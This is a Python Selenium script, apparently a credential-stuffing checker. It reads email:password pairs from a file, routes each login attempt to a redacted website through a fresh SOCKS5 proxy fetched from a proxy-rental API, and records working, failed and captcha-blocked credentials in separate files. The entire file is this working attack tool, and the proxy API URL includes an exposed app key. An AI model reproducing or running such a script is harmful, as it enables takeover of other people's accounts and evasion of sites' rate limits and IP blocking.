#coding=utf-8
from selenium import webdriver
# from selenium.webdriver.firefox.options import Options
# from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
import time
import json
import random
import requests
import re
import datetime
import io
# from bs4 import BeautifulSoup
import sys
#import http.client
# import httplib
import base64
# reload(sys)

# sys.setdefaultencoding('utf8')

email = 'xxxxxxxx'
password = 'xxxxxxxxxx'
url = 'https://www.xxx.com/user/auth/login'
 
def login():
    ip_port = get_ip()

    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')
    # options.add_argument('--disable-gpu')
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36"

    options.add_argument('user-agent={}'.format(user_agent))
    proxy = "--proxy-server=socks5://{}".format(ip_port)
    options.add_argument(proxy)
    driver = webdriver.Chrome(executable_path="C:/Users/yangwu/Downloads/chromedriver/chromedriver.exe",
                              chrome_options=options)

    driver.get("https://www.xxx.com/user/auth/login")
    time.sleep(2)
    print("正在输入登录账号和密码......")
    # 清空账号框中的内容
    driver.find_element_by_name("email").clear()
     
    driver.find_element_by_name("email").send_keys(email)
    time.sleep(1)
    driver.find_element_by_name("password").clear()
    driver.find_element_by_name("password").send_keys(password)
    time.sleep(1)
    # 自动点击登录按钮进行登录
    driver.find_element_by_css_selector(".she-btn-black.she-btn-l.she-btn-block").click()
    time.sleep(5)
    print(driver.current_url)
    time.sleep(5)
    print("登录成功")
    driver.quit() 

def process():
    txt_file = './source.txt'
    success_file = './success.txt'
    failure_file = './failure.txt'
    yan_file = './yan.txt'
    retry_file = './retry.txt'
    with open(str(txt_file)) as f:
        for line in f:
            ip_port = get_ip()
            result = re.match(r'(.*):(.*)', line)
            email = result.group(1).strip()
            password = result.group(2).strip()
            print(email)
            print(password)

            options = webdriver.ChromeOptions()
            # options.add_argument('--headless')
            # options.add_argument('--disable-gpu')
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36"

            options.add_argument('user-agent={}'.format(user_agent))
            proxy = "--proxy-server=socks5://{}".format(ip_port)
            options.add_argument(proxy)
            driver = webdriver.Chrome(executable_path="C:/Users/yangwu/Downloads/chromedriver/chromedriver.exe",
                                      chrome_options=options)

            driver.get("https://www.xxx.com/user/auth/login")
            time.sleep(5)
            print("正在输入登录账号和密码......")
            # 清空账号框中的内容
            try:
                driver.find_element_by_name("email").clear()
            except Exception as e:
                print("异常获取： %s" % str(e))
                time.sleep(5)
                try:
                    driver.find_element_by_name("email").clear()
                except Exception as e:
                    print("异常2次")
                    with open(str(retry_file), "a") as f_write:
                        f_write.write("%s:%s" % (email, password) + "\n")
                    continue

            driver.find_element_by_name("email").send_keys(email)
            time.sleep(1)
            driver.find_element_by_name("password").clear()
            driver.find_element_by_name("password").send_keys(password)
            time.sleep(1)
            # 自动点击登录按钮进行登录
            driver.find_element_by_css_selector(".she-btn-black.she-btn-l.she-btn-block").click()
            time.sleep(5)
            print(driver.current_url)
            # 登录成功
            if driver.current_url == 'https://www.xxx.com/':
                with open(str(success_file), "a") as f_write:
                    time_stamp = datetime.datetime.now().strftime('%Y.%m.%d-%H:%M:%S')
                    f_write.write("%s:%s %s %s" % (email, password, ip_port, 'Success') + "\r\n")
                print("登录成功")
            # 登录失败
            elif driver.find_element_by_css_selector('.login-error').text:
                with open(str(failure_file), "a") as f_write:
                    time_stamp = datetime.datetime.now().strftime('%Y.%m.%d-%H:%M:%S')
                    f_write.write("%s:%s %s %s" % (email, password, ip_port, 'Failure') + "\r\n")
                print("登录失败")

            # 验证码
            else:
                with open(str(yan_file), "a") as f_write:
                    time_stamp = datetime.datetime.now().strftime('%Y.%m.%d-%H:%M:%S')
                    f_write.write("%s:%s %s %s" % (email, password, ip_port, 'Other') + "\r\n")
                print("验证码")

            time.sleep(1)
            driver.quit()

def get_ip():
    url_getips = "http://api.wandoudl.com/api/ip?app_key=87b69790622a156a4bec520b0f8ca212&pack=208007&num=20&xy=3&type=2&lb=\r\n&mr=1&"
    r = requests.get(url_getips)
    ori_ips =json.loads(r.text)
    ips = ori_ips['data']
    print(ips)
    ips_num = 0
    ip_port = ips[ips_num]['ip'] + ":" + str(ips[ips_num]['port'])
    print('代理服务器地址：' + ip_port)

    return ip_port

 
if __name__ == '__main__':
    # login()
    process()
